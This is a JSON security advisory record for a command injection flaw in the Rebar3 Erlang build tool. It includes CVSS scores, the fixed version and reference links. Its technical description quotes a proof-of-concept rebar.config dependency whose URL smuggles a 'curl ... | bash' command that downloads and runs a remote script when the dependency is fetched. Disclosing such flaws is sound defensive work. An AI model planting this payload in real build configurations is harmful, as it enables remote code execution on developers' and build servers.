{
    "source": "BDSA",
    "name": "BDSA-2020-4099",
    "title": "Rebar3 Tool for Erlang Vulnerable to Remote Code Execution (RCE) via Malicious URLs in 'rebar.config' File",
    "description": "Rebar3 Tool for Erlang contains a remote code execution (RCE) vulnerability because of insufficient sanitization measures. An attacker could exploit this flaw to execute malicious code on the server.",
    "technicalDescription": "The `rebar.config` file is used to specify application dependencies. However, URLs specified in this file are not properly sanitized before the dependencies are fetched. This can allow an attacker to inject malicious code within these URLs. Afterwards, when Rebar3 commands like `clean`, `compile`, etc. are executed, the malicious code will execute on the server. This vulnerability exists because unsanitized URL content is passed to the `sh()` function, which then leads to remote code execution.\n\nAs shown in the PoC, an attacker could add a dependency `dephelper` like this:\n```\n{\n      'dephelper', \".*\", { \n        hg, \"https://github.com/vulnbe/poc-rebar3-helper.git?repo=main&threadId=19:428af44abb014e318e7d225a4a88acc2@thread.tacv2&ctx=channel|curl\\t-fsSL\\thttps://gist.githubusercontent.com/vulnbe/6e5ec8fae3bdbee8e5f11f15c1462e48/raw/94616f0ee52935fda458c889d6f686958c79a2c8/poc.sh|bash\\t-|git\\tclone\\thttps://github.com/vulnbe/poc-rebar3-helper.git\", \n      \"dephelper\"}\n}\n```\nWhen this dependency is being fetched, the `git` command will execute on the server.\n\nThis vulnerability was fixed by filtering multiple special characters in `src/rebar_utils.erl` using a regular expression.",
    "publishedDate": "2021-01-21T16:48:21.292Z",
    "updatedDate": "2021-01-21T16:48:21.281Z",
    "disclosureDate": "2020-06-03T00:00:00.000Z",
    "exploitPublishDate": "2020-06-03T00:00:00.000Z",
    "solution": "Fixed in [**3.14.0**](https://github.com/erlang/rebar3/releases/tag/3.14.0) by [this](https://github.com/erlang/rebar3/commit/2e2d1a6bb141a969b6483e082a2afd361fc2ece2) commit.\n\nThe latest stable releases are available [here](https://github.com/erlang/rebar3/releases).",
    "severity": "HIGH",
    "cvss2": {
        "baseScore": 6.5,
        "impactSubscore": 6.4,
        "exploitabilitySubscore": 8.0,
        "severity": "MEDIUM",
        "accessVector": "NETWORK",
        "accessComplexity": "LOW",
        "authentication": "SINGLE",
        "confidentialityImpact": "PARTIAL",
        "integrityImpact": "PARTIAL",
        "availabilityImpact": "PARTIAL",
        "temporalMetrics": {
            "exploitability": "PROOF_OF_CONCEPT",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 5.1
        },
        "vector": "(AV:N/AC:L/Au:S/C:P/I:P/A:P/E:POC/RL:OF/RC:C)"
    },
    "cvss3": {
        "baseScore": 9.9,
        "impactSubscore": 6.0,
        "exploitabilitySubscore": 3.1,
        "severity": "HIGH",
        "attackVector": "NETWORK",
        "attackComplexity": "LOW",
        "confidentialityImpact": "HIGH",
        "integrityImpact": "HIGH",
        "availabilityImpact": "HIGH",
        "privilegesRequired": "LOW",
        "scope": "CHANGED",
        "userInteraction": "NONE",
        "temporalMetrics": {
            "exploitability": "PROOF_OF_CONCEPT",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 8.9
        },
        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C"
    },
    "useCvss3": true,
    "classifications": [],
    "zeroDay": false,
    "underReview": false,
    "parentAdvisory": false,
    "credit": "Alexey Pronin \uff08vulnbe)",
    "workaround": "",
    "vendorFixDate": "2020-06-06T00:00:00.000Z",
    "bdsaTags": [
        "RCE"
    ],
    "overallScore": 8.9,
    "_meta": {
        "allow": [
            "GET"
        ],
        "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-4099",
        "links": [
            {
                "rel": "cwes",
                "href": "https://trendmicro2.app.blackduck.com/api/cwes/CWE-78"
            },
            {
                "rel": "related-vulnerability",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/CVE-2020-13802",
                "label": "NVD"
            },
            {
                "rel": "bdsa-ranges",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-4099/ranges"
            },
            {
                "rel": "reference",
                "href": "https://github.com/erlang/rebar3/commit/2e2d1a6bb141a969b6483e082a2afd361fc2ece2",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/erlang/rebar3/releases",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/erlang/rebar3/releases/tag/3.14.0",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://packetstormsecurity.com/files/159027/Rebar3-3.13.2-Command-Injection.html",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://packetstormsecurity.com/files/159027/Rebar3-3.13.2-Command-Injection.html",
                "label": "POC"
            },
            {
                "rel": "reference",
                "href": "https://vuln.be/post/rebar3-command-injection/",
                "label": "ADVISORY"
            },
            {
                "rel": "default-remediation-status",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-4099/default-remediation-status"
            }
        ]
    }
}